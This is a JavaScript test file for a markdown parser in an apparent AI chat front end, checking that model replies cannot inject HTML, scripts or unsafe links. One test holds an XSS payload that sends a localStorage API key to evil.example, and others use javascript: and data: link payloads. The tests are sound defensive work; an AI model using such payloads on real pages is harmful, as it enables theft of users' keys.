import { test } from 'node:test';
import assert from 'node:assert/strict';
import { parseBlocks, parseInline } from '../src/js/markdown.js';

const text = (t) => ({ type: 'text', text: t });

// Every node type the renderer knows. If a reply could ever produce another
// type (say, raw HTML), render.js would need to handle it — and this is the
// place that would notice.
const KNOWN = new Set(['paragraph', 'heading', 'code', 'list', 'quote', 'rule', 'text', 'strong', 'em', 'link']);
function typesIn(nodes, seen = new Set()) {
  for (const node of nodes) {
    if (Array.isArray(node)) {
      typesIn(node, seen); // a list item is an array of blocks
      continue;
    }
    seen.add(node.type);
    if (node.children) typesIn(node.children, seen);
    if (node.items) typesIn(node.items, seen);
  }
  return seen;
}

test('HTML in a reply stays text — there is nothing for the page to execute', () => {
  // The API key sits in localStorage; a reply that could inject markup could read it.
  const hostile = 'Sure! <img src=x onerror="fetch(\'https://evil.example/?k=\'+localStorage.getItem(\'my-ai-harness:v1\'))">\n\n<script>alert(1)</script>';
  const blocks = parseBlocks(hostile);
  for (const type of typesIn(blocks)) assert.ok(KNOWN.has(type), `unexpected node type: ${type}`);
  assert.deepEqual(blocks[1], { type: 'paragraph', children: [text('<script>alert(1)</script>')] });
});

test('only web and mail links become links; javascript: and data: stay as written', () => {
  const [good] = parseInline('[docs](https://openrouter.ai/docs)');
  assert.deepEqual(good, { type: 'link', href: 'https://openrouter.ai/docs', children: [text('docs')] });

  for (const source of ['[click](javascript:alert(1))', '[click](data:text/html,<script>alert(1)</script>)', '[click](JaVaScRiPt:alert(1))']) {
    const nodes = parseInline(source);
    assert.ok(!nodes.some((n) => n.type === 'link'), `${source} must not become a link`);
  }
});

test('an image in a reply becomes a link — the page never loads a remote image', () => {
  // A remote image URL is a way to leak data through its query string.
  assert.deepEqual(parseInline('![chart](https://example.com/c.png?leak=1)'), [
    { type: 'link', href: 'https://example.com/c.png?leak=1', children: [text('chart')] },
  ]);
});

test('a code block that is still streaming already shows as code', () => {
  // Mid-stream, the closing fence has not arrived yet.
  const blocks = parseBlocks('Here you go:\n\n```python\ndef f(x):\n    return x * 2');
  assert.deepEqual(blocks[1], { type: 'code', lang: 'python', text: 'def f(x):\n    return x * 2' });
});

test('code blocks keep their contents literal', () => {
  const blocks = parseBlocks('```md\n# not a heading\n**not bold** and <b>not html</b>\n- not a list\n```\nAfter.');
  assert.deepEqual(blocks, [
    { type: 'code', lang: 'md', text: '# not a heading\n**not bold** and <b>not html</b>\n- not a list' },
    { type: 'paragraph', children: [text('After.')] },
  ]);
});

test('the usual shape of a model answer: heading, steps with nested points, a closing line', () => {
  const blocks = parseBlocks(
    ['## Setup', '', '1. Install **Node**', '   - version 22 or later', '   - no packages needed', '2. Run `node --test`', '', 'That is all.'].join('\n'),
  );
  assert.deepEqual(
    blocks.map((b) => b.type),
    ['heading', 'list', 'paragraph'],
  );
  const steps = blocks[1];
  assert.equal(steps.ordered, true);
  assert.equal(steps.items.length, 2);
  // Step 1 holds its own line and a nested bullet list with two points.
  assert.deepEqual(steps.items[0][0], { type: 'paragraph', children: [text('Install '), { type: 'strong', children: [text('Node')] }] });
  assert.equal(steps.items[0][1].type, 'list');
  assert.equal(steps.items[0][1].ordered, false);
  assert.equal(steps.items[0][1].items.length, 2);
  assert.deepEqual(steps.items[1], [{ type: 'paragraph', children: [text('Run '), { type: 'code', text: 'node --test' }] }]);
});

test('identifiers and arithmetic are not mistaken for emphasis', () => {
  assert.deepEqual(parseInline('set max_tokens and top_p in my_config_file'), [text('set max_tokens and top_p in my_config_file')]);
  assert.deepEqual(parseInline('2 * 3 * 4 = 24'), [text('2 * 3 * 4 = 24')]);
  assert.deepEqual(parseInline('it is *really* _quite_ **good**'), [
    text('it is '),
    { type: 'em', children: [text('really')] },
    text(' '),
    { type: 'em', children: [text('quite')] },
    text(' '),
    { type: 'strong', children: [text('good')] },
  ]);
});

test('a bare URL is clickable and does not swallow the sentence punctuation', () => {
  assert.deepEqual(parseInline('See https://openrouter.ai/keys.'), [
    text('See '),
    { type: 'link', href: 'https://openrouter.ai/keys', children: [text('https://openrouter.ai/keys')] },
    text('.'),
  ]);
});

test('a sentence that happens to start a line with a year is not turned into a list', () => {
  const blocks = parseBlocks('The protocol was standardised in\n1981. It has been revised since.');
  assert.equal(blocks.length, 1);
  assert.equal(blocks[0].type, 'paragraph');
});
